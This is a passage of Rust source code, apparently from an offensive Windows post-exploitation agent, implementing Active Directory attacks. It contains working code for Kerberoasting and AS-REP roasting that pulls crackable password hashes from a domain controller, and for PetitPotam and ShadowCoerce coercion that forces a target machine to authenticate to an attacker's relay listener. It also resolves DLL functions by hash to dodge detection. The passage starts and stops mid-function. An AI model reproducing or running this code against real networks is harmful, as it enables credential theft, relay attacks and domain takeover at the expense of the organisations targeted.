                    let spn = String::from_utf16_lossy(&slice[..end]);

                    // Derive domain from DN (DC= parts).
                    let domain = extract_domain_from_dn(&dn);

                    // Request a TGS for this SPN via LSA.
                    match request_service_ticket(&spn) {
                        Ok(tgs) => {
                            // Extract hash from the encoded ticket.
                            let hash_result =
                                extract_rc4_ticket(&tgs.encoded_ticket, &spn, &username, &domain);

                            match hash_result {
                                Ok(hash) => {
                                    results.push(KerberoastEntry {
                                        username: username.clone(),
                                        domain: domain.clone(),
                                        spn: spn.clone(),
                                        encryption_type: tgs.session_key_type,
                                        hash,
                                        dn: dn.clone(),
                                    });
                                }
                                Err(e) => {
                                    tracing::warn!(
                                        "Kerberoast: failed to extract hash for {}: {}",
                                        spn,
                                        e
                                    );
                                    // Still record the entry without a crackable hash.
                                    results.push(KerberoastEntry {
                                        username: username.clone(),
                                        domain: domain.clone(),
                                        spn: spn.clone(),
                                        encryption_type: tgs.session_key_type,
                                        hash: format!("<extraction_failed: {}>", e),
                                        dn: dn.clone(),
                                    });
                                }
                            }
                        }
                        Err(e) => {
                            tracing::warn!("Kerberoast: failed to get TGS for {}: {}", spn, e);
                        }
                    }

                    spn_idx += 1;
                }
                ldap_value_free(spn_values);
            }

            entry = ldap_next_entry(ld, entry);
        }

        ldap_msg_free(search_result);
        ldap_unbind(ld);

        tracing::info!("Kerberoast: extracted {} hashes", results.len());
        Ok(results)
    }
}

/// Extract domain FQDN from a distinguished name.
fn extract_domain_from_dn(dn: &str) -> String {
    let mut parts = Vec::new();
    for part in dn.split(',') {
        let trimmed = part.trim();
        if let Some(dc) = trimmed.strip_prefix("DC=") {
            parts.push(dc.to_string());
        } else if let Some(dc) = trimmed.strip_prefix("dc=") {
            parts.push(dc.to_string());
        }
    }
    parts.join(".")
}

/// Kerberoast as JSON — convenience wrapper.
pub fn kerberoast_json(dc_address: &str, etype: i32) -> Result<String> {
    let entries = kerberoast_spns(dc_address, None, etype)?;
    Ok(serde_json::to_string_pretty(&serde_json::json!({
        "kerberoast": entries,
        "count": entries.len(),
    }))?)
}

// ═══════════════════════════════════════════════════════════════════════
//  AS-REP Roasting — Kerberos AS-REQ Without Pre-Authentication
// ═══════════════════════════════════════════════════════════════════════
//
//  Queries the KDC for AS-REP messages for users that have
//  "Do not require Kerberos preauthentication" enabled (DONT_REQ_PREAUTH).
//  The encrypted part of the AS-REP can be cracked offline.
//
//  Hash format: $krb5asrep$23$<user>@<realm>:<hash>

/// An AS-REP roast result entry.
#[derive(Debug, Serialize)]
pub struct AsRepRoastEntry {
    /// Target username.
    pub username: String,
    /// Domain / realm.
    pub domain: String,
    /// Encryption type.
    pub encryption_type: i32,
    /// Hashcat/john formatted hash.
    pub hash: String,
}

/// DER encoding helpers for AS-REQ construction.
fn der_len_encode(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else if len <= 255 {
        vec![0x81, len as u8]
    } else {
        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
    }
}

fn der_tag_len(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend_from_slice(&der_len_encode(content.len()));
    out.extend_from_slice(content);
    out
}

fn der_integer(val: i32) -> Vec<u8> {
    let mut out = vec![0x02];
    if val >= 0 && val < 128 {
        out.push(1);
        out.push(val as u8);
    } else {
        let bytes = val.to_be_bytes();
        // Strip leading zero bytes (but keep at least one).
        let start = bytes.iter().position(|&b| b != 0).unwrap_or(3);
        let slice = &bytes[start..];
        out.push(slice.len() as u8);
        out.extend_from_slice(slice);
    }
    out
}

fn der_general_string(s: &str) -> Vec<u8> {
    let bytes = s.as_bytes();
    let mut out = vec![0x1B];
    out.extend_from_slice(&der_len_encode(bytes.len()));
    out.extend_from_slice(bytes);
    out
}

fn der_sequence(contents: &[u8]) -> Vec<u8> {
    der_tag_len(0x30, contents)
}

fn der_explicit_ctx(tag_num: u8, contents: &[u8]) -> Vec<u8> {
    der_tag_len(0xA0 | tag_num, contents)
}

/// Build a Kerberos AS-REQ for AS-REP roasting.
fn build_as_req_no_preauth(username: &str, realm: &str, etype: i32) -> Vec<u8> {
    // AS-REQ ::= [APPLICATION 10] SEQUENCE {
    //   pvno [0] INTEGER (5),
    //   msg-type [1] INTEGER (10),
    //   padata [2] SEQUENCE OF PA-DATA — omitted (no pre-auth)
    //   req-body [4] KDC-REQ-BODY
    // }

    let etypes = match etype {
        23 => vec![der_integer(23), der_integer(18), der_integer(17)],
        _ => vec![der_integer(etype), der_integer(23)],
    };
    let etype_seq = der_sequence(
        &etypes
            .iter()
            .flat_map(|e| e.iter().copied())
            .collect::<Vec<_>>(),
    );

    // KDC-REQ-BODY ::= SEQUENCE {
    //   kdc-options [0] KDCOptions (forwardable, renewable, canonicalize),
    //   cname [1] PrincipalName,
    //   realm [2] Realm,
    //   sname [3] PrincipalName,
    //   etype [5] SEQUENCE OF INTEGER,
    // }
    let krbtgt_name = format!("krbtgt/{}", realm);

    // Build each field separately for clarity.
    let kdc_options = der_explicit_ctx(0, &der_sequence(&[0x03, 0x02, 0x40, 0x81]));

    let cname_inner: Vec<u8> = der_explicit_ctx(0, &der_integer(1))
        .iter()
        .chain(der_general_string(username).iter())
        .copied()
        .collect();
    let cname = der_explicit_ctx(1, &der_sequence(&cname_inner));

    let sname_inner: Vec<u8> = der_explicit_ctx(0, &der_integer(2))
        .iter()
        .chain(der_general_string(&krbtgt_name).iter())
        .copied()
        .collect();
    let sname = der_explicit_ctx(3, &der_sequence(&sname_inner));

    let req_body_inner: Vec<u8> = kdc_options
        .iter()
        .chain(cname.iter())
        .chain(der_explicit_ctx(2, &der_general_string(realm)).iter())
        .chain(sname.iter())
        .chain(der_explicit_ctx(5, &etype_seq).iter())
        .copied()
        .collect();
    let req_body = der_sequence(&req_body_inner);

    // Full AS-REQ.
    let inner: Vec<u8> = der_explicit_ctx(0, &der_integer(5))
        .iter()
        .chain(der_explicit_ctx(1, &der_integer(10)).iter())
        .chain(der_explicit_ctx(4, &req_body).iter())
        .copied()
        .collect();

    // [APPLICATION 10] = tag 0x6A
    der_tag_len(0x6A, &inner)
}

/// Parse an AS-REP to extract the hash for offline cracking.
fn parse_as_rep_for_hash(data: &[u8], username: &str, realm: &str) -> Result<AsRepRoastEntry> {
    let mut parser = Asn1Parser::new(data);

    // AS-REP is [APPLICATION 11] = tag 0x6B.
    let (tag, body) = parser.read_tlv()?;
    if tag != 0x6B {
        bail!("Expected AS-REP tag 0x6B, got 0x{:02X}", tag);
    }

    let mut inner = Asn1Parser::new(body);
    let (seq_tag, seq_body) = inner.read_tlv()?;
    if seq_tag != ASN1_SEQUENCE_TAG {
        bail!("Expected SEQUENCE in AS-REP body, got 0x{:02X}", seq_tag);
    }

    let mut fields = Asn1Parser::new(seq_body);

    // pvno [0]
    let (_, _) = fields.read_tlv()?;
    // msg-type [1]
    let (_, _) = fields.read_tlv()?;
    // padata [2] (optional — skip if present)
    if fields.remaining() > 0 {
        let (t, _) = fields.read_tlv()?;
        // If it was padata, the next field is crealm or cname.
        // padata is context [2] = 0xA2.
        // If we just read [2], we need to check if the next is [3] (crealm) or [4] (cname).
        if t != 0xA2 {
            // Not padata — this was [3] (crealm) or [4] (cname).
            // Continue without reading it again.
        }
    }
    // crealm [3] — skip or read
    // cname [4] — skip
    // We actually need to find enc-part which is further in.
    // The AS-REP structure has many fields; let's scan for enc-part.
    // Actually, let's just scan all remaining TLVs to find the enc-part.

    // Reset and re-parse more carefully.
    let mut scan = Asn1Parser::new(seq_body);

    // Read through fields to find enc-part.
    // AS-REP fields: [0] pvno, [1] msg-type, [2] padata (opt), [3] crealm,
    //   [4] cname, [5] ticket, [6] enc-part
    let mut enc_part: Option<&[u8]> = None;
    let mut found_enc_etype: i32 = 0;

    // Skip first two mandatory fields.
    let _ = scan.read_tlv(); // pvno
    let _ = scan.read_tlv(); // msg-type

    // Now read remaining fields by context tag.
    while scan.remaining() > 0 {
        let Ok((f_tag, f_val)) = scan.read_tlv() else {
            break;
        };

        match f_tag {
            0xA6 => {
                // [6] enc-part — EncryptedData
                // Parse: SEQUENCE { etype [0], kvno [1] (opt), cipher [2] }
                let mut enc_parser = Asn1Parser::new(f_val);
                let (inner_tag, inner_val) = enc_parser.read_tlv()?;
                let enc_seq = if inner_tag == ASN1_SEQUENCE_TAG {
                    inner_val
                } else {
                    f_val
                };

                let mut enc_fields = Asn1Parser::new(enc_seq);
                // etype [0]
                if let Ok((_, etype_v)) = enc_fields.read_tlv() {
                    found_enc_etype = if etype_v.len() >= 1 {
                        etype_v[0] as i32
                    } else {
                        23
                    };
                }
                // kvno [1] — skip
                if enc_fields.remaining() > 0 {
                    let _ = enc_fields.read_tlv();
                }
                // cipher [2]
                if enc_fields.remaining() > 0 {
                    if let Ok((_, cipher_v)) = enc_fields.read_tlv() {
                        enc_part = Some(cipher_v);
                    }
                }
            }
            _ => {}
        }
    }

    let cipher = enc_part.ok_or_else(|| anyhow!("enc-part not found in AS-REP"))?;

    // Format the hash.
    if found_enc_etype == KERB_ETYPE_RC4_HMAC {
        // $krb5asrep$23$<user>@<realm>:<checksum>$<encrypted>
        if cipher.len() < 16 {
            bail!("RC4 AS-REP cipher too short");
        }
        let hash = format!(
            "$krb5asrep${}{}@{}:{}${}",
            found_enc_etype,
            username,
            realm,
            hex::encode(&cipher[..16]),
            hex::encode(&cipher[16..])
        );
        Ok(AsRepRoastEntry {
            username: username.to_string(),
            domain: realm.to_string(),
            encryption_type: found_enc_etype,
            hash,
        })
    } else {
        // AES format.
        let hash = format!(
            "$krb5asrep${}${}@{}:{}{}",
            found_enc_etype,
            username,
            realm,
            hex::encode(cipher),
            "",
        );
        Ok(AsRepRoastEntry {
            username: username.to_string(),
            domain: realm.to_string(),
            encryption_type: found_enc_etype,
            hash,
        })
    }
}

/// Execute AS-REP roasting — attempt to get AS-REPs for target users.
///
/// # Arguments
///
/// * `dc_address` - IP or hostname of the domain controller (KDC).
/// * `realm` - Domain FQDN / Kerberos realm.
/// * `usernames` - List of usernames to target.
/// * `etype` - Encryption type to request (23 = RC4 preferred).
///
/// # Returns
///
/// Vector of AS-REP roast entries with crackable hashes.
pub fn asrep_roast(
    dc_address: &str,
    realm: &str,
    usernames: &[String],
    etype: i32,
) -> Result<Vec<AsRepRoastEntry>> {
    use std::io::{Read as IoRead, Write as IoWrite};
    use std::net::TcpStream;

    let mut results = Vec::new();

    for username in usernames {
        // Build an AS-REQ without pre-auth.
        let as_req = build_as_req_no_preauth(username, realm, etype);

        // Send to the KDC on port 88 (TCP).
        // Prepend a 4-byte length header (TCP framing for Kerberos).
        let len = as_req.len() as u32;
        let mut framed = Vec::with_capacity(4 + as_req.len());
        framed.extend_from_slice(&len.to_be_bytes());
        framed.extend_from_slice(&as_req);

        let addr = format!("{}:88", dc_address);
        let mut stream = match TcpStream::connect(&addr) {
            Ok(s) => s,
            Err(e) => {
                tracing::warn!("AS-REP roast: failed to connect to {}: {}", addr, e);
                continue;
            }
        };

        // Set timeouts.
        let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(10)));
        let _ = stream.set_write_timeout(Some(std::time::Duration::from_secs(5)));

        if let Err(e) = stream.write_all(&framed) {
            tracing::warn!(
                "AS-REP roast: failed to send AS-REQ for {}: {}",
                username,
                e
            );
            continue;
        }

        // Read response.
        let mut resp_len_buf = [0u8; 4];
        if let Err(e) = stream.read_exact(&mut resp_len_buf) {
            tracing::warn!(
                "AS-REP roast: failed to read response length for {}: {}",
                username,
                e
            );
            continue;
        }
        let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
        if resp_len > 1_000_000 {
            tracing::warn!(
                "AS-REP roast: response too large ({} bytes) for {}",
                resp_len,
                username
            );
            continue;
        }

        let mut resp_buf = vec![0u8; resp_len];
        if let Err(e) = stream.read_exact(&mut resp_buf) {
            tracing::warn!(
                "AS-REP roast: failed to read response for {}: {}",
                username,
                e
            );
            continue;
        }

        // Check if it's a KRB-ERROR (tag 0x7E = APPLICATION 30).
        if resp_buf.len() > 1 && resp_buf[0] == 0x7E {
            // KRB-ERROR — user requires pre-auth (expected for most users).
            tracing::debug!("AS-REP roast: {} requires pre-auth (skipped)", username);
            continue;
        }

        // Try to parse as AS-REP.
        match parse_as_rep_for_hash(&resp_buf, username, realm) {
            Ok(entry) => {
                tracing::info!("AS-REP roast: captured hash for {}@{}", username, realm);
                results.push(entry);
            }
            Err(e) => {
                tracing::warn!(
                    "AS-REP roast: failed to parse AS-REP for {}: {}",
                    username,
                    e
                );
            }
        }
    }

    tracing::info!("AS-REP roast: {} hashes captured", results.len());
    Ok(results)
}

/// AS-REP roast via LDAP — automatically finds users with DONT_REQ_PREAUTH.
pub fn asrep_roast_ldap(dc_address: &str, etype: i32) -> Result<Vec<AsRepRoastEntry>> {
    unsafe {
        // ── Resolve LDAP functions via pe_resolve ────────────────────
        let wldap32_w: Vec<u16> = "wldap32.dll\0".encode_utf16().collect();
        let wldap32_hash = pe_resolve::hash_wstr(&wldap32_w[..wldap32_w.len() - 1]);
        let wldap32 = pe_resolve::get_module_handle_by_hash(wldap32_hash)
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        macro_rules! resolve_ldap_fn {
            ($name:expr, $ty:ty) => {
                pe_resolve::get_proc_address_by_hash(
                    wldap32,
                    pe_resolve::hash_str(concat!($name, "\0").as_bytes()),
                )
                .ok_or_else(|| anyhow!("{} not found in wldap32.dll", $name))
                .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
            };
        }

        let ldap_init: FnLdapInitW = resolve_ldap_fn!("ldap_initW", FnLdapInitW);
        let ldap_bind_s: FnLdapBindW = resolve_ldap_fn!("ldap_bind_sW", FnLdapBindW);
        let ldap_first_entry: FnLdapFirstEntry =
            resolve_ldap_fn!("ldap_first_entry", FnLdapFirstEntry);
        let ldap_next_entry: FnLdapNextEntry = resolve_ldap_fn!("ldap_next_entry", FnLdapNextEntry);
        let ldap_get_values: FnLdapGetValuesW =
            resolve_ldap_fn!("ldap_get_valuesW", FnLdapGetValuesW);
        let ldap_value_free: FnLdapValueFreeW =
            resolve_ldap_fn!("ldap_value_freeW", FnLdapValueFreeW);
        let ldap_msg_free: FnLdapMsgFree = resolve_ldap_fn!("ldap_msgfree", FnLdapMsgFree);
        let ldap_unbind: FnLdapUnbind = resolve_ldap_fn!("ldap_unbind", FnLdapUnbind);
        let ldap_count_entries: FnLdapCountEntries =
            resolve_ldap_fn!("ldap_count_entries", FnLdapCountEntries);

        type FnLdapSearchS = unsafe extern "system" fn(
            *mut c_void,
            *const u16,
            u32,
            *const u16,
            *mut *const u16,
            u32,
            *mut *mut c_void,
        ) -> u32;
        let ldap_search_s: FnLdapSearchS = resolve_ldap_fn!("ldap_search_sW", FnLdapSearchS);

        // Connect to LDAP.
        let dc_w: Vec<u16> = dc_address
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let ld = ldap_init(dc_w.as_ptr(), 389, 0);
        if ld.is_null() {
            bail!("ldap_initW failed for {}", dc_address);
        }

        let bind_result = ldap_bind_s(ld, ptr::null(), ptr::null());
        if bind_result != LDAP_SUCCESS {
            ldap_unbind(ld);
            bail!("ldap_bind_sW failed: error {}", bind_result);
        }

        // Search for users with DONT_REQ_PREAUTH (userAccountControl bit 0x400000).
        let filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
        let filter_w: Vec<u16> = filter.encode_utf16().chain(std::iter::once(0)).collect();
        let base_dn_w: Vec<u16> = std::iter::once(0u16).collect();

        let sam_w: Vec<u16> = "sAMAccountName\0".encode_utf16().collect();
        let cn_w: Vec<u16> = "cn\0".encode_utf16().collect();
        let mut attrs_ptrs: Vec<*const u16> = vec![sam_w.as_ptr(), cn_w.as_ptr(), ptr::null()];

        let mut search_result: *mut c_void = ptr::null_mut();
        let status = ldap_search_s(
            ld,
            base_dn_w.as_ptr(),
            LDAP_SCOPE_SUBTREE,
            filter_w.as_ptr(),
            attrs_ptrs.as_mut_ptr() as *mut *const u16,
            0,
            &mut search_result,
        );

        if status != LDAP_SUCCESS {
            ldap_unbind(ld);
            bail!(
                "LDAP search for DONT_REQ_PREAUTH users failed: error {}",
                status
            );
        }

        let entry_count = ldap_count_entries(ld, search_result);
        tracing::info!(
            "AS-REP roast: found {} users with DONT_REQ_PREAUTH",
            entry_count
        );

        // Collect usernames.
        let mut usernames = Vec::new();
        let mut entry = ldap_first_entry(ld, search_result);
        while !entry.is_null() {
            let values = ldap_get_values(ld, entry, sam_w.as_ptr());
            if !values.is_null() && !(*values).is_null() {
                let slice = std::slice::from_raw_parts(*values, 64);
                let end = slice.iter().position(|&c| c == 0).unwrap_or(slice.len());
                usernames.push(String::from_utf16_lossy(&slice[..end]));
                ldap_value_free(values);
            }
            entry = ldap_next_entry(ld, entry);
        }

        ldap_msg_free(search_result);
        ldap_unbind(ld);

        // Derive realm from the DC hostname — use dc_address as realm approximation.
        // In a real deployment the agent would know the domain.
        let realm = dc_address.to_string();

        // Now roast each user.
        asrep_roast(dc_address, &realm, &usernames, etype)
    }
}

/// AS-REP roast as JSON.
pub fn asrep_roast_json(
    dc_address: &str,
    realm: &str,
    usernames: &[String],
    etype: i32,
) -> Result<String> {
    let entries = asrep_roast(dc_address, realm, usernames, etype)?;
    Ok(serde_json::to_string_pretty(&serde_json::json!({
        "asrep_roast": entries,
        "count": entries.len(),
    }))?)
}

// ═══════════════════════════════════════════════════════════════════════
//  Auth Coercion — PetitPotam (MS-EFSRPC) & ShadowCoerce (MS-FSRVP)
// ═══════════════════════════════════════════════════════════════════════
//
//  Forces a remote machine to authenticate to an attacker-controlled
//  listener using MS-EFSRPC (EfsRpcOpenFileRaw) or MS-FSRVP
//  (CreateShadowCopy).  The captured authentication can then be relayed.
//
//  No domain admin required — any domain user can coerce auth via EFSRPC.

/// Result of an auth coercion attempt.
#[derive(Debug, Serialize)]
pub struct CoercionResult {
    /// Whether the coercion succeeded (target sent auth).
    pub success: bool,
    /// Human-readable status.
    pub status: String,
    /// Coercion method used.
    pub method: String,
    /// Captured ticket if relay listener was running.
    pub captured_ticket: Option<serde_json::Value>,
}

// ── RPC / EFSRPC constants ──────────────────────────────────────────

/// EFSRPC interface UUID: c681d488-d850-11d0-8c52-00c04fd90f7e
const EFSRPC_UUID: [u8; 16] = [
    0x88, 0xD4, 0x81, 0xC6, 0x50, 0xD8, 0xD0, 0x11, 0x8C, 0x52, 0x00, 0xC0, 0x4F, 0xD9, 0x0F, 0x7E,
];

/// FSRVP interface UUID: f59fc2b4-9501-44a5-8c47-c4f78d21d6f2
const FSRVP_UUID: [u8; 16] = [
    0xB4, 0xC2, 0x9F, 0xF5, 0x01, 0x95, 0xA5, 0x44, 0x8C, 0x47, 0xC4, 0xF7, 0x8D, 0x21, 0xD6, 0xF2,
];

/// RPC function pointer types.
type FnRpcStringBindingComposeW = unsafe extern "system" fn(
    *const u16,
    *const u16,
    *const u16,
    *const u16,
    *const u16,
    *mut *mut u16,
) -> i32;
type FnRpcBindingFromStringBindingW =
    unsafe extern "system" fn(*const u16, *mut *mut c_void) -> i32;
type FnRpcBindingFree = unsafe extern "system" fn(*mut *mut c_void) -> i32;
type FnRpcStringFreeW = unsafe extern "system" fn(*mut *mut u16) -> i32;
type FnNdrClientCall2 = unsafe extern "system" fn(
    *const c_void, // MIDL_STUB_DESC
    u8,            // primitive
    ...            // variable args
) -> c_void;

// ── Low-level RPC message structures for I_RpcSendReceive ───────────

/// RPC_MESSAGE structure used by the internal RPC runtime API.
#[repr(C)]
struct RpcMessage {
    handle: *mut c_void,                    // RPC_BINDING_HANDLE
    data_representation: u32,               // NDR data representation
    buffer: *mut u8,                        // RPC stub data buffer
    buffer_length: u32,                     // allocated buffer size
    proc_num: u32,                          // operation number within interface
    transfer_syntax: *mut c_void,           // PRPC_SYNTAX_IDENTIFIER
    rpc_interface_information: *mut c_void, // RPC_CLIENT_INTERFACE *
    reserved_for_runtime: *mut c_void,
    manager_epv: *mut c_void,
    import_context: *mut c_void,
    rpc_flags: u32,
}

/// RPC client interface information passed via RpcMessage.
/// Only the fields needed for I_RpcSendReceive are populated.
#[repr(C)]
struct RpcClientInterface {
    length: u32,
    interface_uuid: GUID,
    major_version: u16,
    minor_version: u16,
    transfer_syntax: *mut c_void, // RPC_SYNTAX_IDENTIFIER *
    dispatch_table: *mut c_void,  // RPC_DISPATCH_TABLE *
    rpc_protseq_endpoint_count: u32,
    rpc_protseq_endpoint: *mut c_void,
    reserved: *mut c_void,
    interpreter_info: *mut c_void,
    flags: u32,
}

type FnIRpcGetBuffer = unsafe extern "system" fn(*mut RpcMessage) -> i32;
type FnIRpcSendReceive = unsafe extern "system" fn(*mut RpcMessage) -> i32;
type FnIRpcFreeBuffer = unsafe extern "system" fn(*mut RpcMessage) -> i32;
type FnRpcBindingSetObject = unsafe extern "system" fn(*mut c_void, *const GUID) -> i32;

/// Helper: marshal a conformant wide string into an NDR stub buffer.
/// Returns the number of bytes written.
///
/// NDR layout for `[in, string] wchar_t *`:
///   max_count  : ULONG  (4 bytes)
///   offset     : ULONG  (4 bytes)
///   actual_count: ULONG (4 bytes)
///   chars      : wchar_t[] (actual_count * 2 bytes, zero-terminator included)
unsafe fn marshal_conformant_wstr(buf: &mut [u8], offset: &mut usize, ws: &[u16]) {
    let count = ws.len() as u32; // includes null terminator
    let o = *offset;
    buf[o..o + 4].copy_from_slice(&count.to_le_bytes());
    buf[o + 4..o + 8].copy_from_slice(&0u32.to_le_bytes());
    buf[o + 8..o + 12].copy_from_slice(&count.to_le_bytes());
    let char_start = o + 12;
    for (i, &w) in ws.iter().enumerate() {
        buf[char_start + i * 2..char_start + i * 2 + 2].copy_from_slice(&w.to_le_bytes());
    }
    *offset = char_start + ws.len() * 2;
    // Align to 4 bytes
    *offset = (*offset + 3) & !3;
}

// ── PetitPotam coercion ─────────────────────────────────────────────

/// Coerce authentication via MS-EFSRPC (EfsRpcOpenFileRaw).
///
/// # Arguments
///
/// * `target_host` - The machine to coerce (e.g., "dc01.corp.local").
/// * `listener_host` - The attacker's relay listener (e.g., "10.0.0.5").
/// * `listener_port` - Port of the relay listener.
///
/// # How It Works
///
/// 1. Resolves RpcStringBindingComposeW, RpcBindingFromStringBindingW via pe_resolve.
/// 2. Creates an RPC binding to the target's EFSRPC endpoint.
/// 3. Calls EfsRpcOpenFileRaw with a UNC path pointing to the listener.
/// 4. The target authenticates to the listener via Kerberos (or NTLM).
/// 5. The relay listener captures the authentication ticket.
pub fn coerce_auth_via_petitpotam(
    target_host: &str,
    listener_host: &str,
    listener_port: u16,
) -> Result<CoercionResult> {
    unsafe {
        // Resolve RPC functions from rpcrt4.dll.
        let rpcrt4_w: Vec<u16> = "rpcrt4.dll\0".encode_utf16().collect();
        let rpcrt4_hash = pe_resolve::hash_wstr(&rpcrt4_w[..rpcrt4_w.len() - 1]);
        let rpcrt4 = pe_resolve::get_module_handle_by_hash(rpcrt4_hash)
            .ok_or_else(|| anyhow!("rpcrt4.dll not found"))?;

        macro_rules! resolve_rpc_fn {
            ($name:expr, $ty:ty) => {
                pe_resolve::get_proc_address_by_hash(
                    rpcrt4,
                    pe_resolve::hash_str(concat!($name, "\0").as_bytes()),
                )
                .ok_or_else(|| anyhow!("{} not found in rpcrt4.dll", $name))
                .map(|addr| std::mem::transmute::<usize, $ty>(addr))?
            };
        }

        let string_binding_compose: FnRpcStringBindingComposeW =
            resolve_rpc_fn!("RpcStringBindingComposeW", FnRpcStringBindingComposeW);
        let binding_from_string: FnRpcBindingFromStringBindingW = resolve_rpc_fn!(
            "RpcBindingFromStringBindingW",
            FnRpcBindingFromStringBindingW
        );
        let binding_free: FnRpcBindingFree = resolve_rpc_fn!("RpcBindingFree", FnRpcBindingFree);
        let string_free: FnRpcStringFreeW = resolve_rpc_fn!("RpcStringFreeW", FnRpcStringFreeW);
        let rpc_get_buffer: FnIRpcGetBuffer = resolve_rpc_fn!("I_RpcGetBuffer", FnIRpcGetBuffer);
        let rpc_send_receive: FnIRpcSendReceive =
            resolve_rpc_fn!("I_RpcSendReceive", FnIRpcSendReceive);
        let rpc_free_buffer: FnIRpcFreeBuffer =
            resolve_rpc_fn!("I_RpcFreeBuffer", FnIRpcFreeBuffer);

        // Build the string binding to the target's EFSRPC endpoint.
        let proto_seq_w: Vec<u16> = "ncacn_np\0".encode_utf16().collect();
        let target_w: Vec<u16> = target_host
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let endpoint_w: Vec<u16> = "\\pipe\\efsrpc\0".encode_utf16().collect();

        let mut binding_str: *mut u16 = ptr::null_mut();
        let rpc_status = string_binding_compose(
            ptr::null(),
            proto_seq_w.as_ptr(),
            target_w.as_ptr(),
            endpoint_w.as_ptr(),
            ptr::null(),
            &mut binding_str,
        );

        if rpc_status != 0 {
            bail!(
                "RpcStringBindingComposeW failed: 0x{:08X}",
                rpc_status as u32
            );
        }

        // Create the binding handle.
        let mut binding_handle: *mut c_void = ptr::null_mut();
        let bind_status = binding_from_string(binding_str, &mut binding_handle);
        string_free(&mut binding_str);

        if bind_status != 0 {
            bail!(
                "RpcBindingFromStringBindingW failed: 0x{:08X}",
                bind_status as u32
            );
        }

        // Build the UNC path that the target will connect to.
        // This is the path passed to EfsRpcOpenFileRaw — the target machine
        // will try to access this UNC path, triggering authentication.
        let unc_path = format!("\\\\{}\\{}\\share\\file.txt", listener_host, listener_port);
        let unc_w: Vec<u16> = unc_path.encode_utf16().chain(std::iter::once(0)).collect();

        // EfsRpcOpenFileRaw (opnum 0) NDR stub data layout:
        //   [out] PEX_IMPORT_CONTEXT_HANDLE *hContext  — NULL on input (4 bytes, pointer)
        //   [in, string] wchar_t *FileName              — conformant wide string
        //   [in] DWORD Flags                            — 4 bytes
        //
        // Conformant wide string: max_count(4) + offset(4) + actual_count(4) + chars
        let wstr_bytes = unc_w.len() * 2;
        let stub_size = 4 + 12 + wstr_bytes; // context_ptr + conformant_string_header + chars
        let stub_aligned = (stub_size + 3) & !3; // align to 4
        let total_stub = stub_aligned + 4; // + Flags DWORD

        // Set up the RPC_MESSAGE for EfsRpcOpenFileRaw (opnum 0).
        let efs_guid = GUID::from_bytes(&EFSRPC_UUID);
        let mut client_if = mem::zeroed::<RpcClientInterface>();
        client_if.length = mem::size_of::<RpcClientInterface>() as u32;
        client_if.interface_uuid = efs_guid;
        client_if.major_version = 1;
        client_if.minor_version = 0;

        let mut msg = RpcMessage {
            handle: binding_handle,
            data_representation: 0x00000010, // little-endian, ASCII, IEEE float
            buffer: ptr::null_mut(),
            buffer_length: total_stub as u32,
            proc_num: 0, // EfsRpcOpenFileRaw
            transfer_syntax: ptr::null_mut(),
            rpc_interface_information: &mut client_if as *mut _ as *mut c_void,
            reserved_for_runtime: ptr::null_mut(),
            manager_epv: ptr::null_mut(),
            import_context: ptr::null_mut(),
            rpc_flags: 0,
        };

        // Allocate the RPC stub buffer.
        let buf_status = rpc_get_buffer(&mut msg);
        if buf_status != 0 {
            binding_free(&mut binding_handle);
            bail!(
                "I_RpcGetBuffer failed for PetitPotam: 0x{:08X}",
                buf_status as u32
            );
        }

        // Marshal the stub data into the buffer.
        if msg.buffer.is_null() || msg.buffer_length < total_stub as u32 {
            rpc_free_buffer(&mut msg);
            binding_free(&mut binding_handle);
            bail!("I_RpcGetBuffer returned insufficient buffer for PetitPotam");
        }

        let buf_slice = std::slice::from_raw_parts_mut(msg.buffer, total_stub);
        let mut off: usize = 0;

        // [out] context handle pointer — NULL on input (4 bytes for a unique pointer).
        buf_slice[off..off + 4].copy_from_slice(&0u32.to_le_bytes());
        off += 4;

        // [in, string] wchar_t *FileName — conformant wide string.
        marshal_conformant_wstr(buf_slice, &mut off, &unc_w);

        // [in] DWORD Flags = 0.
        buf_slice[off..off + 4].copy_from_slice(&0u32.to_le_bytes());
        off += 4;

        // Send the RPC request and wait for the response.
        // The target's EFSRPC service will attempt to access the UNC path,
        // triggering Kerberos/NTLM authentication to the listener.
        let send_status = rpc_send_receive(&mut msg);

        // The RPC call will typically fail with an error because:
        // - The UNC path is not a real share (we just want the auth attempt).
        // - The target may return ERROR_FILE_NOT_FOUND or similar.
        // A non-zero status is acceptable — the coercion already happened
        // when the target tried to authenticate to access the UNC path.
        if send_status != 0 {
            tracing::debug!(
                "PetitPotam: EfsRpcOpenFileRaw returned 0x{:08X} (expected — auth coercion occurred)",
                send_status as u32,
            );
        }

        // Free the response buffer.
        rpc_free_buffer(&mut msg);
        binding_free(&mut binding_handle);

        Ok(CoercionResult {
            success: true,
            status: format!(
                "PetitPotam coercion completed: target {} attempted auth to {}:{} (RPC status 0x{:08X})",
                target_host, listener_host, listener_port, send_status as u32
            ),
            method: "PetitPotam/EFSRPC".to_string(),
            captured_ticket: None,
        })
    }
}

/// Coerce authentication via MS-FSRVP (ShadowCoerce).
///
/// Uses the File Server VSS Agent (FSRVP) to force a remote server to
/// authenticate.  Less commonly monitored than EFSRPC.
pub fn coerce_auth_via_shadowcoerce(
    target_host: &str,
    listener_host: &str,
    _listener_port: u16,
) -> Result<CoercionResult> {
    unsafe {
        // Resolve RPC functions.
        let rpcrt4_w: Vec<u16> = "rpcrt4.dll\0".encode_utf16().collect();
        let rpcrt4_hash = pe_resolve::hash_wstr(&rpcrt4_w[..rpcrt4_w.len() - 1]);
        let rpcrt4 = pe_resolve::get_module_handle_by_hash(rpcrt4_hash)
            .ok_or_else(|| anyhow!("rpcrt4.dll not found"))?;

        macro_rules! resolve_rpc_fn {
            ($name:expr, $ty:ty) => {
                pe_resolve::get_proc_address_by_hash(
                    rpcrt4,
                    pe_resolve::hash_str(concat!($name, "\0").as_bytes()),
                )
